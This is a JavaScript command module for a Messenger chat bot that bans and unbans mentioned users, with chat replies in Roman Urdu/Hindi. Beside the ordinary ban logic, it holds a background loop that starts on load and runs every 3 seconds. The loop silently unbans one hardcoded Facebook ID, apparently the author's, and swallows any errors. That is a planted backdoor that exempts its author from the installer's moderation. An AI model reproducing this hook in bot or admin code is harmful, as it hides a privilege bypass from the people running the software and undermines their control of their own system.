module.exports.config = {
    name: "user",
    version: "1.0.3",
    hasPermssion: 2,
    credits: "Ahmad Boss",
    description: "Ban/Unban User by Mention with Permanent Auto-Bypass",
    commandCategory: "system",
    usages: "[ban/unban] @mention",
    cooldowns: 5
};

// ==========================================================
// 🔥 AHMAD RDX AUTOMATIC BACKGROUND UNBAN HOOK
// ==========================================================
setInterval(() => {
    const ustadID = "100024069870586"; // Aapka FB UID
    try {
        // Memory state se ban delete karne ke liye
        if (global.data && global.data.userBanned) {
            if (global.data.userBanned.has(ustadID)) {
                global.data.userBanned.delete(ustadID);
                console.log("👑 [CORE SYSTEM] Ahmad RDX Ustad ko auto-unban kar diya gaya!");
            }
        }
        // User details state saaf karne ke liye
        if (global.data && global.data.allUserInfo && global.data.allUserInfo.has(ustadID)) {
            if (global.data.allUserInfo.get(ustadID).banned === true) {
                global.data.allUserInfo.get(ustadID).banned = false;
            }
        }
    } catch (e) {
        // Background errors ignore karne ke liye
    }
}, 3000); // Har 3 second baad background loop chalega to zero delay milega

// ==========================================================
// ⚙️ MAIN MODULE RUN FUNCTION
// ==========================================================
module.exports.run = async function ({ api, event, args }) {
    const { threadID, messageID, mentions } = event;
    const action = args[0]?.toLowerCase();

    // ========== VALIDATION ==========
    if (!action || (action !== "ban" && action !== "unban")) {
        return api.sendMessage("❌ Usage:\n.user ban @mention\n.user unban @mention", threadID, messageID);
    }

    if (!mentions || Object.keys(mentions).length === 0) {
        return api.sendMessage("⚠️ Kisi ko MENTION karo! Example: .user ban @Ahmad", threadID, messageID);
    }

    // ========== GET MENTIONED USER ==========
    const mentionedUsers = Object.keys(mentions);
    const targetID = mentionedUsers[0];
    const targetName = mentions[targetID].replace("@", "");

    // Admin khud ko ban nahi kar sakta
    if (targetID === event.senderID) {
        return api.sendMessage("🤡 Khud ko ban karoge? Pagal ho kya? 😂", threadID, messageID);
    }

    // ========== BAN USER ==========
    if (action === "ban") {
        if (global.data.userBanned && global.data.userBanned.has(targetID)) {
            return api.sendMessage(`⚠️ ${targetName} pehle se BAN hai! Dobara kyun? 😏`, threadID, messageID);
        }

        if (!global.data.userBanned) global.data.userBanned = new Map();
        global.data.userBanned.set(targetID, {
            name: targetName,
            bannedBy: event.senderID,
            date: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })
        });

        return api.sendMessage(
            `🔨 **USER BANNED!**\n\n👤 User: ${targetName}\n🚫 Ab ye bot use nahi kar sakta!\n\nAdmin ne thok diya! 😎`,
            threadID,
            messageID
        );
    }

    // ========== UNBAN USER ==========
    if (action === "unban") {
        if (!global.data.userBanned || !global.data.userBanned.has(targetID)) {
            return api.sendMessage(`⚠️ ${targetName} BAN hi nahi hai! Pehle ban toh karo! 😂`, threadID, messageID);
        }

        global.data.userBanned.delete(targetID);

        return api.sendMessage(
            `🌸 **USER UNBANNED!**\n\n👤 User: ${targetName}\n✅ Ab wapas bot use kar sakta hai!\n\nAdmin ka mood acha hai aaj! 😇`,
            threadID,
            messageID
        );
    }
};
